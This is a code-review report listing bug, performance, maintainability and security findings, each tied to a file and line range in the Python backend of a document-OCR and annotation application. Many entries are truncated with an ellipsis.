- **`backend/app/db.py:552`** (bug) — `idx_pages_unique` is dropped and recreated on every startup. On a legacy database that already contains duplicate `(project_id, abs_path, pdf_page)` rows the `CREATE UNIQUE INDEX` raises, so the application fails to boot with a raw SQLite error; on every…
- **`backend/app/domain/inference.py:99-101`** (bug) — Quote tracking starts before the outer list does, so an apostrophe in the model's preamble (e.g. "Here's the layout:") sets `self.quote` and puts the scanner in string mode; the following `[` is then swallowed as string content and `complete` is never…
- **`backend/app/domain/inference.py:337-338`** (bug) — `payload.update(values)` runs after the core body is built, so the sampling dict has the last word on every key: a sampling entry named `model`, `messages`, `stream`, `stream_options` or `extra_args` silently replaces the request the caller just…
- **`backend/app/domain/otsl.py:49-50`** (bug) — Overlapping cells are not rejected: a later cell silently overwrites the span markers written by an earlier one (`meta[rr][cc]` is simply reassigned), while `_start_text` still returns the text of the first cell found in the list at `(rr, cc)`. The…
- **`backend/app/domain/otsl.py:65-66`** (performance) — `_start_text` linearly scans the whole `cells` list for every start position, making `grid_to_otsl` O(rows*cols*cells) (up to ~4096 × len(cells) iterations on a grid just under the size limit). Build a `{(r, c): text}` index once before the traversal instead.
- **`backend/app/domain/otsl.py:202-204`** (bug) — Every top-level `<table>` is parsed into the same `self.rows` list, so `html_to_otsl` concatenates the rows of all tables (contradicting the docstring "il primo `<table>`") and rowspan state in `pending` leaks from one table into the next. After the first…
- **`backend/app/domain/otsl.py:263-268`** (bug) — When the row has no more cells but a pending rowspan starts in a later column, `col` is advanced without emitting any token. OTSL is positional, so the row ends up with fewer tokens than the grid has columns and every later token lands in the wrong column…
- **`backend/app/domain/prefill.py:156-163`** (bug) — This block re-implements the bbox/label parsing that `_box_of`/`_label_of` already provide, and the two paths validate differently: the first loop tolerates a non-numeric bbox by appending the item to `kept`, but `previous_box` is then converted with…
- **`backend/app/domain/table_headers.py:78-79`** (bug) — For `k > n/2` the period test degenerates to a single comparison (`range(n - k)` has one element), so a spurious period is accepted on almost no evidence, and the code then unconditionally assumes the **last** group is the truncated one (`spans[-1] = n -…
- **`backend/app/domain/table_similarity.py:51-52`** (maintainability) — Dead branch: `left_nodes` and `right_nodes` are zero only when the grid has no rows and no accepted cells, in which case both trees are `TableNode('table', children=[])` and the preceding `left == right` check already returns 1.0. This guard can never be…
- **`backend/app/domain/table_similarity.py:55`** (performance) — APTED is O(n^3) in the tree size and this runs unguarded on every evaluated table. Note that `services/evaluate.py` explicitly documents that on full-page registers (dozens of rows x columns, i.e. hundreds of nodes) "l'algoritmo esatto è troppo lento" and…
- **`backend/app/domain/vram.py:92`** (bug) — `dict(known or _DEFAULT_ARCH)` does not merge: when `known` is supplied it fully replaces the defaults, contradicting the docstring's fallback chain. Any recipe architecture that omits a key (`weights_mib`, `intermediate_size`, ...) makes `estimate` raise…
- **`backend/app/domain/vram.py:138-139`** (bug) — `cfg['gradient_checkpointing']` is never consulted: the checkpointing formulas (`saved = L×tokens×H×2`, single-layer `recompute`) and the recorded assumption are hard-coded to `True`. The toolchain can genuinely run with checkpointing off…
- **`backend/app/main.py:29-30`** (bug) — The single-process invariant is only enforced for the `WEB_CONCURRENCY` env var, which uvicorn/gunicorn do not set when started with `uvicorn app.main:app --workers 4` (or a gunicorn config that omits it). In that case the guard passes and exactly the…
- **`backend/app/models/__init__.py:55`** (maintainability) — This comprehension silently overwrites on a duplicate `adapter_id`: two modules declaring the same id collapse into one entry with no error, and the dropped model's surfaces simply disappear from every derived registry (the reverse case — one module…
- **`backend/app/models/base.py:39`** (maintainability) — `SPEC_SURFACES` is a hand-maintained copy of the `ModelSpec` fields and nothing ties the two together, which undercuts the file's own promise of import-time completeness. If a field is added to `ModelSpec` but not here, `surface()` raises `KeyError` ("not…
- **`backend/app/models/base.py:62-64`** (bug) — `value()` collapses two different states into `None`: "the surface does not exist" (`NotApplicable`) and "the surface exists but its declared value is `None`/falsy". Callers cannot tell them apart: `NATIVE_LABELS` in `services/model_labels.py` filters on…
- **`backend/app/models/gemini_argon.py:13-16`** (bug) — `labels=NotApplicable(...)` does more than document an absence: `model_labels.DIRECT_CANONICAL` is built from exactly these keys, and `known_canonical()` then returns the *whole* `PUBLIC_LABELS` set for the model. That over-claims for gemini-argon, whose…
- **`backend/app/models/gemini_argon.py:18`** (maintainability) — `SettingsSpec()` defaults to `sections=("serving", "generation", "image", "workflow", "mlx")`, but gemini-argon has no serve recipe and no local MLX path, so most of those groups are inert: - `serving` (dtype, gpu_memory_utilization, max_model_len,…
- **`backend/app/models/paddleocr_vl.py:21`** (bug) — `paragraph_title` is PP-DocLayout's paragraph/section heading, and the project taxonomy has a dedicated `Section-header` class for exactly that (see `docs/spec/10-official-conventions.md` §2.7 and `docs/spec/60-taxonomy.md`). Mapping it to `Title` here…
- **`backend/app/services/annotation_schema.py:82-86`** (bug) — The table checks are incomplete for a contract that exporters rely on. Missing: (a) `table.region_id` is never checked against `annotation.regions`, so a logical table pointing at a non-existent region passes validation; (b) duplicate/overlapping cells are…
- **`backend/app/services/annotation_schema.py:114`** (bug) — Table grids are silently discarded here: a grid is only attached when the region is labelled exactly `"Table"` (hard-coded literal, not derived from the project label taxonomy) *and* whose id is a key of `tables`. Any stored `tables` row belonging to a…
- **`backend/app/services/annotation_schema.py:117`** (bug) — `int(grid.get("rows", 0))`, `int(grid.get("cols", 0))` and `int(grid.get("header_rows", 0) or 0)` raise `TypeError` when the key is present with a `null` value (the default only applies when the key is *missing*). More importantly, when `grid_json` fails…
- **`backend/app/services/annotation_schema.py:118-119`** (bug) — The grid extraction is not defensive against JSON payloads that are absent, `null`, or not dict-shaped, yet the whole page conversion aborts (TypeError) when that happens: `grid.get("cells", [])` returns `None` when the key exists with value `null` and…
- **`backend/app/services/artifacts.py:41-42`** (bug) — Asymmetric symlink handling: `write_manifest` hashes any path for which `is_file()` is true, and `is_file()` follows symlinks (and `rglob("**")` descends through symlinked directories on older Pythons), so symlinked artifacts are written into the manifest.…
- **`backend/app/services/audit.py:26`** (bug) — `payload` is typed `dict[str, Any]`, so any non-JSON-native value (e.g. `datetime`, `Decimal`, a `Path`, a dataclass) makes `json.dumps` raise `TypeError`. Because `record` runs inside the caller's transaction, that exception also aborts the business write…
- **`backend/app/services/audit.py:47-48`** (bug) — `sqlite3.Connection`'s context manager only commits/rolls back the transaction; it does not close the connection. `record_event` therefore relies on CPython reference counting to release the file handle when `conn` goes out of scope, which emits…
- **`backend/app/services/auth.py:153-154`** (security) — When the account is deactivated the token is rejected but the session row is kept, unlike the expired branch above; combined with the fact that deactivation never calls `delete_sessions`, re-activating the account silently resurrects every previously…
- **`backend/app/services/auth.py:155`** (security) — `SELECT u.*` plus `dict(row)` puts the whole `users` row (including `password_hash`, `salt`, `invite_token_hash`) into the dict that is then injected as `user` into every route dependency. A single endpoint returning or logging that dict would leak the…
- **`backend/app/services/auto_training.py:171`** (bug) — `subprocess.run(..., timeout=...)` raises `subprocess.TimeoutExpired`, which is not handled here nor in the `_ssh` polling loops during prebuilt/provisioning waits. A single transient SSH stall during an up-to-75-minute provisioning makes the call raise…
- **`backend/app/services/auto_training.py:540-541`** (maintainability) — This branch is unreachable: `paddle` is already a key of `PREBUILT_IMAGES`, so `prebuilt` is always true for that profile and the `if prebuilt:` arm is taken first. `PADDLE_IMAGE` therefore only exists as dead code (the same dead condition is repeated in…
- **`backend/app/services/backup.py:19-21`** (performance) — The `with sqlite3.connect(...)` block is a transaction context manager, not a closing one: it commits/rolls back but never calls `conn.close()`. Every `integrity()` call (hit on each `GET /api/system/backup`, plus inside `create_backup`/`restore`) leaks a…
- **`backend/app/services/backup.py:31-32`** (bug) — Two problems on this pair of connections: (1) if `sqlite3.connect(target)` raises (missing dir, permissions), `source` is never closed because the `try/finally` only starts afterwards; (2) if `source.backup(dest)`/`dest.commit()` raises, the partially…
- **`backend/app/services/benchmark.py:141-143`** (maintainability) — The log file handle opened above is handed to `Popen` but never stored in the returned dict nor closed in `_stop_local`, so it stays open for the whole run (and, more importantly, leaks forever if `Popen` raises — the exception is not caught here, so the…
- **`backend/app/services/benchmark.py:628`** (bug) — `_ACTIVE` is mutated under `_LOCK` in `start_benchmark`, but the worker's cleanup runs without it and `benchmark_status` reads the dict without the lock. Two consequences: (1) a status poll landing between `_write_state(state="running")` and…
- **`backend/app/services/blocks.py:24-27`** (bug) — Only `json.loads` is guarded: the coordinate conversion below runs outside the `try`. If the stored `points` column contains a JSON value that is not a list of pairs (`null`, a dict, `[1,2]`, `[["a"],...]`, a 3-element triple), the unpacking/`float()`…
- **`backend/app/services/blocks.py:79`** (bug) — On the conflict path `list_page_blocks` opens a *second* `annotationstore.writing()` connection while the current one is still inside its (unfinished) transaction. It happens to work today, but it doubles the DB connections per conflicting autosave, holds…
- **`backend/app/services/blocks.py:108-109`** (bug) — Duplicate ids in `payload.items` are not rejected: the same existing id is sent to `update_block` twice (the second call silently overwrites the first, so a client-side duplication causes silent data loss) and the id is appended to `assigned` twice,…
- **`backend/app/services/checkpoint_prepare.py:29`** (bug) — `_LOCK` is a plain (non-reentrant) `threading.Lock`, but `start_prepare` calls `_job_status(...)` *while holding it* (the "already running" branch). Any fix that makes `_job_status` take the same lock to serialize `run.json` writes (needed to close the…
- **`backend/app/services/checkpoint_prepare.py:241-243`** (other) — `join(timeout=3)` does not guarantee the sampler has stopped: if it is in the middle of `_tree_bytes`/`_save` when the timeout expires it keeps running and can write its stale `progress` (phase `download`, percent < 100) to `run.json` *after* the final…
- **`backend/app/services/checkpoint_prepare.py:320-321`** (security) — `checkpoint_rel`/`output_rel` come from `checkpoint_info()` (directory names found on disk, possibly produced by remote artifacts) and are interpolated into a double-quoted shell string without quoting or basename validation: a name containing `"`,…
- **`backend/app/services/cloud_manager.py:33-35`** (bug) — These module-level globals are read/written by `start_ssh_tunnel`, `stop_ssh_tunnel` and `get_tunnel_status` with no lock. The cloud endpoints are sync `def` handlers, so FastAPI runs them in the anyio threadpool: two concurrent start/stop calls can…
- **`backend/app/services/cloud_manager.py:186-187`** (bug) — `stop_ssh_tunnel()` runs *before* any validation of `host`/`port`/`local_port`. A malformed request (empty host, port 0/out of range, invalid `native_remote_port`) tears down the working tunnel and only then raises `ValueError`, producing an avoidable…
- **`backend/app/services/cloud_manager.py:268-271`** (bug) — The tunnel process is long-lived but its `stdout`/`stderr` pipes are never drained. `ssh -N` writes warnings there (repeated `ServerAlive` diagnostics, port-forward noise); once the ~64 KB pipe buffer fills, `ssh` blocks on write and the tunnel silently…
- **`backend/app/services/cloud_manager.py:372-374`** (bug) — The retry list is missing the error written by `get_tunnel_status` when the child dies ("Processo terminato con codice …"). Such a row is `state="failed"` and therefore treated as an explicit stop, so the intent to restore the tunnel is lost —…
- **`backend/app/services/cloud_manager.py:805-808`** (bug) — These calls bypass `_vast_call` and hit `VAST_API_BASE` (v0) directly on the `/instances/` collection — the very collection this module documents as migrated to v1 ("la v0 risponde 410 deprecated_endpoint"). `start`/`stop`/`delete` therefore surface the…
- **`backend/app/services/cloud_manager.py:1359`** (bug) — `_classify_ssh_failure` returns the reasons `refused` and `timeout` (and `check_ssh_access` sets `timeout` on `subprocess.TimeoutExpired`), but this catalog only defines `auth`, `hostkey`, `dns`, `unreachable` and `unknown`. Those two very common failures…
- **`backend/app/services/cloud_manager.py:1724`** (security) — The docstring of `provision_vast_server` claims the server API key "viaggia come variabile d'ambiente, non come argomento, per non finire in `ps`", but the assignment is inlined into the remote command string that is passed as an `ssh` argv: the secret is…
- **`backend/app/services/compute_profiles.py:31`** (bug) — `credential_ref` is user-controlled (`ComputeProfileIn.credential_ref`, no format validation) and is echoed back into `vault.has()`/`vault.get()`. `vault._validate_name` raises `ValueError` for refs that do not match `^[A-Za-z0-9][A-Za-z0-9_.:-]{0,119}$`…
- **`backend/app/services/compute_profiles.py:56-57`** (bug) — Check-then-act race: `any_exists()` opens its own connection and the `insert` below happens in a second, separate transaction. Two concurrent first-time requests (e.g. two parallel `GET /api/system/compute-profiles`) can both see an empty table and both…
- **`backend/app/services/compute_profiles.py:89`** (bug) — `name` has a UNIQUE constraint in the schema, but duplicates are not handled: a second profile with an existing name raises `sqlite3.IntegrityError`, which escapes as an unhandled 500 instead of a clear 409/400. Translate the integrity error into an…
- **`backend/app/services/compute_profiles.py:110-111`** (performance) — The health check performs a synchronous HTTP request (and `validate_endpoint` above performs DNS resolution) with a 10s timeout while the `with connect()` scope is still open. The DB connection stays open for the whole remote call, and this endpoint can be…
- **`backend/app/services/corpus.py:16-17`** (bug) — `exact_duplicate_pages` can never be non-zero: `sources` only counts `source_kind == 'image'` rows, and the DB enforces `CREATE UNIQUE INDEX idx_pages_unique ON pages(project_id, abs_path, COALESCE(pdf_page, -1))` (db.py), so for image rows (`pdf_page`…
- **`backend/app/services/dataset_builder.py:267-268`** (bug) — This `except Exception` spans the whole band pipeline (bbox computation, `crop_block_image`, hline indexing, crop, JPEG save). Only `pagesvc.source_missing`/empty-crop errors are expected failures; a programming error (e.g. an out-of-range `hlines` index…
- **`backend/app/services/dataset_builder.py:354`** (bug) — In the single-group fallback the pages are concatenated in `sorted` order and `rng`/`seed` is never applied, so the validation split is always the tail of the ordered page list (e.g. the last 10% of a single issue/year/source). The docstring promises a…
- **`backend/app/services/dataset_builder.py:461-465`** (bug) — Outside the layout branch, blocks with missing or unparseable `points` are dropped silently: no warning reaches the report, so the export looks clean while text_rec/formula/table samples silently disappear (layout does emit `points_missing` for the same…
- **`backend/app/services/dataset_builder.py:649-650`** (bug) — The comment above claims that "a crash does not leave a dataset mixed between two builds", but the replacements are done one file at a time: a failure after the first `replace` leaves, for instance, `layout_train.jsonl` from the new build and…
- **`backend/app/services/dewarp.py:92-93`** (bug) — The documented "sempre sicura" fallback is not guarded: `deskew` imports `cv2` inside the function (see `backend/app/services/images.py`), so on a host where OpenCV is not importable it raises `ImportError` instead of returning an image. Nothing here nor…
- **`backend/app/services/dewarp.py:128-129`** (bug) — `_last_engine` is assigned **before** the engine value is validated (and before it is known whether the engine produced any image). For an unknown engine string the function returns `actual_engine="none"` but `last_engine()` keeps reporting the bogus…
- **`backend/app/services/doctor.py:52-55`** (bug) — The write probe uses a fixed file name and treats a failing `unlink()` as "not writable". Two problems: a pre-existing user file named `.tabularium-write-probe` is silently overwritten (and then deleted), and two concurrent `doctor` runs (or any other…
- **`backend/app/services/doctor.py:119-120`** (bug) — `config.DB_PATH.exists()` is a weak "database is initialised" test: SQLite creates the database file the moment something calls `sqlite3.connect()`, so a 0-byte file (or a DB left before `init_db` ran) exists but has no `meta` table. In that case…
- **`backend/app/services/doctor.py:133`** (bug) — `SO_REUSEADDR` defeats the very check on Windows, where it allows `bind()` to succeed over an already-listening socket: a server that is running and holding the port would be reported as `[ok] … libera`, and the real conflict only surfaces later at…
- **`backend/app/services/doctor.py:245`** (bug) — A malformed `HF_ENDPOINT` (e.g. `huggingface.co` without a scheme, or a value with an invalid port) makes `urlopen()` raise `ValueError`, which is neither `URLError` nor `OSError` and therefore escapes `check_huggingface()`. The doctor then dies with a…
- **`backend/app/services/domain_profiles.py:14-17`** (bug) — A malformed or unreadable profile file is dropped with a bare `continue`, so the failure is completely invisible: the profile simply disappears from `/api/system/domain-profiles`, and `get_profile()` later reports `unknown domain profile: <id>` even though…
- **`backend/app/services/domain_profiles.py:18-19`** (bug) — The only schema check is that `id` is truthy. A profile whose `id` is a number, or whose `legacy_ids` is a string/null, passes this filter and then breaks the consumers below: `profile_id in profile.get("legacy_ids", [])` performs a *substring* match when…
- **`backend/app/services/evaluate.py:213`** (performance) — `table_metrics` still computes the exact APTED tree-edit TEDS for every table, although `row_aligned_similarity`'s docstring states that the exact algorithm is too slow for full-page registers (dozens of rows × columns) and that the row-aligned proxy…
- **`backend/app/services/evaluate.py:291-292`** (bug) — When the page image cannot be rendered (`load_source_image` returns `None`), the page is still scored with `pred_items = []`: layout precision/recall/F1, strict F1 and reading-order Levenshtein all become 0 (worst possible) and the page is counted in…
- **`backend/app/services/evaluate.py:499`** (bug) — If the server ping fails or every page fails inference, `ok_pages` is empty and the run still returns and persists a report with `pages_evaluated: 0` and `None`/`0` aggregates, with no error signal for the caller or for later comparison runs. Fail loudly…
- **`backend/app/services/evaluate.py:521-522`** (bug) — The eval directory name has second resolution, so two evaluations started within the same second (double click, or an evaluation running concurrently with another one) resolve to the same `eval_<ts>` directory and the second `write_text` silently…
- **`backend/app/services/export_formats.py:31`** (maintainability) — Files are written sequentially and the function only returns at the end; there is no rollback. If a later format raises (e.g. `int()` on a malformed id/rowspan, or `_bbox` on malformed points), earlier artefacts stay on disk as stale/partial output and the…
- **`backend/app/services/export_formats.py:40`** (security) — `page["abs_path"]` is written verbatim as the COCO `file_name`, leaking the server's absolute filesystem layout into an export artefact that is typically shared with third parties. Use a relative reference (e.g. `page["rel_path"]` or the basename) instead.
- **`backend/app/services/hardware.py:117-120`** (bug) — `cuda.available` is derived from the vLLM runtime verdict (`supported` is true only on Linux), not from actual GPU presence, while `devices` comes from a separate `cuda_devices()` probe. The two fields can therefore contradict each other: on Windows/native…
- **`backend/app/services/huggingface_auth.py:28-30`** (maintainability) — Only the dict snapshot/update is guarded by `_lock`, while the decision-making I/O (`get_token()`, `whoami()`, `login()`, `logout()`) and the subsequent `_set()` calls happen outside it. Two overlapping requests (e.g. the status poll running concurrently…
- **`backend/app/services/huggingface_auth.py:47-52`** (performance) — `status()` performs a network round-trip (`whoami()`) on **every** call whenever a token is present, because the resolved username is written only into the returned copy and never persisted in `_state`. Since `status()` is exposed via `GET…
- **`backend/app/services/i18n.py:37`** (bug) — This template is anchored with `$` by `_template_pattern`, but the code that raises it appends the expected path (see `_source_missing_exception` in `services/pages.py`: `f"file sorgente non presente: {expected}"`). Since the runtime detail has a suffix…
- **`backend/app/services/i18n.py:586-593`** (bug) — The q-value is ignored: the first supported tag wins regardless of its weight. `Accept-Language: en;q=0, it` localizes in English even though the client explicitly marked English unacceptable (`q=0`), and `en;q=0.1, fr;q=0.9` also returns `en`. Parse the…
- **`backend/app/services/images.py:116`** (bug) — The blank-page guard is too weak to do what the comment claims. Projection variance of a *uniform* page is 0 and is handled by accident, but a blank/near-blank scan still full of sensor noise has a strictly positive variance at every angle, so `best_score…
- **`backend/app/services/images.py:121-123`** (maintainability) — `estimate_skew` never reads `min_line_len`, `hough_threshold` or `max_angle` (the body goes straight to `_projection_skew`, which uses its own `lo/hi/step`), and `deskew` still forwards `min_line_len`. These are leftover parameters of the removed Hough…
- **`backend/app/services/images.py:150-153`** (bug) — `import cv2` here (and in `estimate_skew`/`perspective_rectify`) is unguarded, so in the exact scenario the module docstring describes — opencv-python present on disk but failing to import (missing `libGL`) — these functions raise `ImportError`.…
- **`backend/app/services/labeling.py:117-123`** (bug) — `model_copy` is a shallow copy: the returned `LabelDef` shares its `aliases` (and `known_models`) list object with the module-level `DEFAULT_LABELS` entry. Every schema handed out by `default_schema()`/`project_schema()` therefore exposes the module's own…
- **`backend/app/services/labeling.py:139`** (bug) — `labels` is iterated without checking it is a list. If the persisted value is a non-iterable scalar (e.g. `{"labels": 5}`, possible with hand-edited/legacy/imported `settings_json`), `for raw in raw_custom` raises `TypeError`, turning `GET…
- **`backend/app/services/live.py:0`** (bug) — The task returned by `asyncio.ensure_future` is discarded: it is not referenced anywhere, so the event loop only holds a weak reference and the task can be garbage-collected before `broadcast` finishes. Any exception escaping `broadcast` is also never…
- **`backend/app/services/live.py:0`** (bug) — `_room` uses `setdefault`, so every *read* path (`participants`, `presence_message`, and therefore the `presence_message` argument evaluated in `api/live.py:144`) inserts an empty dict into `self._rooms` for pages that nobody is connected to. Those entries…
- **`backend/app/services/live.py:0`** (performance) — The sends are strictly sequential and have no timeout: a single slow/half-open client delays delivery to every other participant in the room, and since the loop is blocked on that `await`, a stalled peer effectively silences the whole room. Consider…
- **`backend/app/services/local_runtime.py:120-123`** (maintainability) — `ensure_ready()` has no mutual exclusion around its check-then-act sequence: two callers (two backend processes, or a start while a previous install is still running) can both see `is_ready() == False`, and the second `venv.EnvBuilder(clear=True).create()`…
- **`backend/app/services/mineru_mlx_runtime.py:65-66`** (bug) — Two robustness problems in the state persistence: (1) `json.loads` may legitimately return a non-dict (e.g. `[]` or a bare string left by a truncated/interrupted write) and `state.update(...)` then raises `AttributeError`, which is not covered by the…
- **`backend/app/services/mineru_mlx_runtime.py:78-79`** (bug) — The readiness probe only checks that the distributions are *present* (`importlib.util.find_spec` does not import top-level modules) plus metadata versions. A venv whose native MLX extension is broken (wrong wheel/arch, missing shared lib, half-finished…
- **`backend/app/services/mineru_mlx_runtime.py:96-100`** (bug) — When the stored state is `"ready"` but `is_ready()` now returns False (venv deleted, Python upgraded, dependency pruned, probe timeout), this returns the contradictory payload `{"ready": False, "state": "ready"}`. Any caller that branches on `state`…
- **`backend/app/services/mineru_mlx_runtime.py:105-107`** (bug) — No mutual exclusion around the check/create/install sequence. `ensure_ready()` runs on a background `serve-start-*` thread (and the module has no lock, unlike `serve_manager._STARTING_LOCK`, which only guards a single process); a second caller — another…
- **`backend/app/services/mineru_mlx_runtime.py:135-138`** (bug) — The `pip install` calls run without a `timeout` and the state file was set to `"installing"` just above. A stalled network / hung resolver leaves the thread blocked indefinitely (it is the background `serve-start` worker) and the state permanently stuck in…
- **`backend/app/services/mlx_runtime.py:88-91`** (bug) — `json.loads` can return any JSON value, not just a dict: a corrupted/hand-edited or partially overwritten state file containing `null`, `[]` or a scalar makes `state.update(...)` raise `AttributeError` (not caught by `(OSError, ValueError)`), and the same…
- **`backend/app/services/mlx_runtime.py:105`** (bug) — When the persisted state says `ready` but `is_ready()` now returns False (venv partially removed, `mlx_vlm` broken by an upgrade, probe failure), this returns `{"ready": False, "state": "ready"}` — a client that trusts `state` reports a broken runtime as…
- **`backend/app/services/mlx_runtime.py:117-120`** (bug) — Unsynchronized check-then-act: the `is_ready()` check and `EnvBuilder(clear=True)` are not atomic, and `clear=True` wipes the whole `<root>/mlx-runtime` directory. Two callers that both see "not ready" (e.g. a start worker plus a retried `start()`, or a…
- **`backend/app/services/modal_manager.py:146-147`** (performance) — `drain()` re-reads and re-decodes the *entire* log file on every 0.3 s poll. Deploy logs (image build + weight download) reach several MB, so this costs O(file size) I/O and CPU three times per second for the whole deploy. Read only the tail instead (e.g.…
- **`backend/app/services/modal_manager.py:300-301`** (bug) — `_token_cache` is read twice without a lock, while `_watch` rebinds it to `None` from another thread — between the `is not None` check and the `[1]`/`[0]` accesses the global can become `None`, raising `TypeError: 'NoneType' object is not subscriptable`…
- **`backend/app/services/modal_manager.py:445-449`** (bug) — After terminating and waiting the deploy, `task.done` is only set later by the `_watch` thread (up to ~0.3 s, or never if the wait timed out). `stop_app()` calls `_start("stop", ...)` immediately after this function returns and `_start` rejects the launch…
- **`backend/app/services/modal_manager.py:451-452`** (bug) — Concurrent writer on the same job row: the `_watch` thread also terminates this job via `jobstore.finish(job_id, "failed", returncode)` as soon as it observes the killed process, and `finish` has no `WHERE state='running'` guard. Depending on the thread…
- **`backend/app/services/modal_manager.py:551-552`** (maintainability) — Both CLI probes above are wrapped in `except Exception: # noqa: BLE001: pass`, and the resulting all-`None` payload (`workspace`/`app_state`/`endpoint`) is cached here for 60 s. A `TimeoutExpired` or malformed `--json` output is therefore reported to the…
- **`backend/app/services/model_labels.py:68-74`** (performance) — `known_models_for` recomputes the whole adapter registry per name, and `list_adapters()` also queries `custom_models.list_all()` (a DB read) and builds a `CustomVllmAdapter` per custom row. The only caller (`api/blocks.py::_label_schema`) invokes this once…
- **`backend/app/services/model_labels.py:113-117`** (bug) — The exact-canonical branch runs before the adapter map for *every* adapter, including the ones that declare a native map. That is fine when the vendor token really is the canon, but a project class whose normalized name coincides with a vendor token…
- **`backend/app/services/model_labels.py:119`** (bug) — `valid` is built from `canonical.values()`, i.e. from the *normalized* dict, not from the real class names. Two project labels whose names differ only by separators (`"Vessel Name"` and `"Vessel_Name"`) are both accepted by…
- **`backend/app/services/model_registry.py:143-145`** (performance) — The file handle created by `log_file.open("wb")` is never closed: `subprocess.run` does not own it, so one descriptor is leaked on every draft preparation (and, for a `Popen`, the parent keeps it open as well). Pass an opened-and-closed handle via a `with`…
- **`backend/app/services/model_registry.py:288-290`** (maintainability) — `_RUNTIME_ACTIVE` is a module-level set shared by every request thread (both `/models` listing and start paths call `ensure_runtime_async`), and this check-then-act is not atomic: two concurrent callers can both pass the test before either calls `.add()`,…
- **`backend/app/services/model_registry.py:518-521`** (bug) — The destructive replace is not atomic: once `rmtree(dest)` runs the previously installed checkpoint is gone, and if `staging.rename(dest)` fails (permissions, a path component removed concurrently, ENOSPC while renaming a large tree on some filesystems)…
- **`backend/app/services/model_registry.py:568-569`** (bug) — The `downloading` state is persisted *before* `Popen`. If `Popen` raises (e.g. `OSError` from a full disk, missing interpreter, fork failure), the exception propagates but no `_ACTIVE` entry is registered, so `install_state()` falls back to…
- **`backend/app/services/model_registry.py:569-571`** (performance) — Same descriptor leak as in `ensure_draft`: the handle returned by `log_file.open("wb")` is never closed and stays open for the whole lifetime of the process (the Popen only duplicates the fd). Open it in a `with` block and close it right after `Popen`…
- **`backend/app/services/model_settings.py:251-253`** (bug) — `repo_choices` and the `mlx_enums` values are `set`s, and the membership test is done without a type guard: a JSON payload such as `{"mlx": {"repo": ["a"]}}` or `{"mlx": {"kv_quant_scheme": {"a": 1}}}` makes `value not in <set>` raise `TypeError:…
- **`backend/app/services/model_settings.py:281-284`** (bug) — Integer-valued knobs are silently truncated instead of rejected: `max_model_len=1024.5`, `max_num_seqs=2.7`, `max_tokens=100.9`, `max_pixels=1e6+0.5`, `kv_group_size=32.5` all pass the range check and are then coerced with `int(value)`. The workflow…
- **`backend/app/services/model_settings.py:381-385`** (bug) — `_validate_workflow` validates the cross-field `requires` rules against `stored overrides + result`, but `save_settings` persists only `result`: the stored workflow overrides used here are dropped by this very write. The check therefore evaluates a state…
- **`backend/app/services/model_surface.py:101-102`** (bug) — This rule exempts *every* surface of a runtime-registered model, including `capabilities` and `settings`, which do exist for them (`model_settings.get_settings("custom-…")` resolves through `get_adapter`, and `_presence("capabilities")` returns True by…
- **`backend/app/services/model_surface.py:138-142`** (maintainability) — The `except` comment says "Unknown adapter", but an unknown adapter makes `get_adapter` raise `ValueError`, never `KeyError`. Catching `KeyError` therefore has no legitimate trigger and instead swallows a genuine `KeyError` raised *inside* `get_settings`…
- **`backend/app/services/model_surface.py:192-196`** (maintainability) — Reading the private `model_registry._CLOUD_TEMPLATES` couples this manifest to an implementation detail that can be renamed/removed, and the lazy import pulls in the whole download machinery once per `matrix()` call. The value is already exposed by the…
- **`backend/app/services/monkey_preprocess.py:55`** (bug) — The module docstring says the official runner uses `preprocess_images()`, but the subprocess calls the singular `preprocess_image`. If the vendored `Preprocessor` only exposes the plural method, every attempt dies with `AttributeError`, the code silently…
- **`backend/app/services/monkey_preprocess.py:114-116`** (bug) — `available()`, `python_bin()` and `tempfile.mkdtemp()` run outside the `try`, so an OSError from `mkdtemp` (full/permission-denied tmpdir, mis-configured `config.SERVE_PYTHON` path) or from the file-system checks inside `available()` propagates to the…
- **`backend/app/services/native_picker.py:70-73`** (bug) — `Path.expanduser()` raises `RuntimeError` (not `OSError`/`ValueError`) when the home directory cannot be resolved, e.g. `start="~nosuchuser/x"` or a container without `$HOME`. `start` comes straight from the API query string, so such input escapes…
- **`backend/app/services/native_picker.py:103-104`** (bug) — Only `FileNotFoundError` is translated here. Other `OSError` subclasses from `subprocess.run` (e.g. `PermissionError` when `sys.executable` is not executable, or `EMFILE`/`E2BIG`) propagate unchanged, so the endpoint returns 500 instead of the intended 501…
- **`backend/app/services/native_picker.py:110`** (bug) — `strip()` removes spaces/tabs as well as the trailing newline, so a legitimate folder ending or starting with whitespace (e.g. `/data/scans `, perfectly valid on POSIX) is silently returned as a different path; a path made only of whitespace also collapses…
- **`backend/app/services/ocr.py:24-25`** (bug) — A config-forced engine is returned without any check that the package is importable, so `OcrEngine.available` (and the `/api/system` health payload built from `available_engine()`) reports `True` when e.g. `TABULARIUM_OCR_ENGINE=paddleocr` but paddleocr is…
- **`backend/app/services/oidc.py:100`** (bug) — `response.json()` can legally return a list, string or number; the subsequent `document.get(...)` then raises `AttributeError`, which is neither an `httpx.HTTPError` nor a `ValueError`, so it escapes the `OidcError` contract and becomes an unhandled 500 in…
- **`backend/app/services/oidc.py:182`** (bug) — Same problem as the discovery document: an error/HTML-ish JSON payload that decodes to a list or scalar makes `tokens.get("access_token")` raise `AttributeError` outside the `except (httpx.HTTPError, ValueError)` clause, producing a 500 instead of an…
- **`backend/app/services/oidc.py:211`** (security) — Only a literal `False` is rejected, so an email whose verification is unknown slips through: providers that omit `email_verified` entirely (allowed by the spec for `/userinfo`) and providers that send it as the string `"false"` both pass, and the address…
- **`backend/app/services/opencode_gateway.py:42-45`** (maintainability) — Any read/parse failure is discarded silently, so a typo in `TABULARIUM_OPENCODE_AUTH`, an unreadable file or a corrupt auth.json is indistinguishable from "no key configured". The caller only sees an empty string and the resulting authentication error is…
- **`backend/app/services/opencode_gateway.py:50-53`** (bug) — Coercing the stored value with `str(...)` means any truthy non-string value (a nested dict, a list, a number) is returned as a "key" and reported as available by `status()`, although it can never be a valid token. Validate the type instead of stringifying…
- **`backend/app/services/paddle_dataset.py:23-26`** (bug) — When the stored boundary count does not match `count + 1` the function silently substitutes perfectly uniform spacing. For any table whose real column/row boundaries are uneven (merged headers, varying column widths), every cell crop is then cut on the…
- **`backend/app/services/paddle_dataset.py:57-60`** (bug) — These coercions only default on a *missing* key: a present-but-null (`"rowspan": null`, or `None` coming from an HTML `<td rowspan>` attribute) raises `TypeError`, a non-numeric string (e.g. `rowspan=""`) raises `ValueError`. Neither `_cell_samples` nor…
